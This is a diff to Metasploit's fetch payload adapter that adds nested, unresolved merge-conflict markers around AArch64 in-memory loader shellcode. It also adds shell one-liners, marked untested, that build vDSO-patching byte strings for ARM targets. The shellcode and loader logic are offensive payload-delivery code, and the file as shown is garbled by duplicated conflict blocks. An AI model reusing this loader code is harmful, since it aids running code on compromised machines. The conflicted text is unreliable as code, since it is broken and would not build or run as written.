@@ -286,6 +286,9 @@ module Msf::Payload::Adapter::Fetch
       # kill(pid,SIGSTOP)
       in_memory_loader_asm = [
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 90b311f7e1 (Adding armbe, armle, untested)
           0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
           0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
           0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
@@ -299,6 +302,7 @@ module Msf::Payload::Adapter::Fetch
           0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
           0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
           0x010000d4, #0x1030:	svc	#0	0x010000d4
+<<<<<<< HEAD
 =======
                   0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
                   0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
@@ -314,6 +318,8 @@ module Msf::Payload::Adapter::Fetch
                   0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
                   0x010000d4, #0x1030:	svc	#0	0x010000d4
 >>>>>>> 70cb91b3a2 (Add Aarch64)
+=======
+>>>>>>> 90b311f7e1 (Adding armbe, armle, untested)
       ]
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
@@ -390,8 +396,16 @@ module Msf::Payload::Adapter::Fetch
 =======
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'aarch64'
+<<<<<<< HEAD
       %^"4000005800001fd6"$(endian $(printf %016x $vdso_addr))^
 >>>>>>> 70cb91b3a2 (Add Aarch64)
+=======
+      %^"4000005800001fd6"$(echo $(printf %16x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    when 'armle'
+      %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
+    when 'armbe'
+      %^"e30"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')""$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')^
+>>>>>>> 90b311f7e1 (Adding armbe, armle, untested)
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
